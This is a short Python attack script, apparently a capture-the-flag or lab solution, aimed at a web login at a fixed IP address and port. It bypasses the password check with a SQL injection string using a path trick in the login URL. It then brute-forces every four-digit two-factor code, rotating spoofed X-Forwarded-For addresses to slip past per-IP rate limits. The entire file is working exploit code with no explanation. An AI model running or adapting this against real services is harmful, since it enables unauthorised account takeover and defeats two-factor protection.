import requests,re,random

def auth():
    s = requests.Session()
    req = requests.Request(method='POST', url="http://94.237.56.188:41500/auth/./login", data={'username':'admin', 'password':"' or 1=1 --"})
    prep =  req.prepare()
    prep.url = "http://94.237.56.188:41500/auth/./login"
    response = s.send(prep, verify=False)
    return s

def generate_pins():
    list = []
    for i in range(10000):
        list.append(f"{i:04}\n")
    pins = open("pins.txt","w")
    random.shuffle(list)
    pins.writelines(list)


def crack_code():
    #generate_pins()
    pins = open("pins.txt","r").readlines()
    ips = open("ips.txt","r").readlines()

    session = auth()
    count = 0
    for pin in pins:
        response = session.post("http://94.237.56.188:41500/auth/verify-2fa", data={'2fa-code':f'{pin}'}, headers={'X-Forwarded-For':f'{ips[count//20].strip()}'})
        if "Invalid" not in response.text:
            print(session.get("http://94.237.56.188:41500/dashboard"))
        count+=1


crack_code()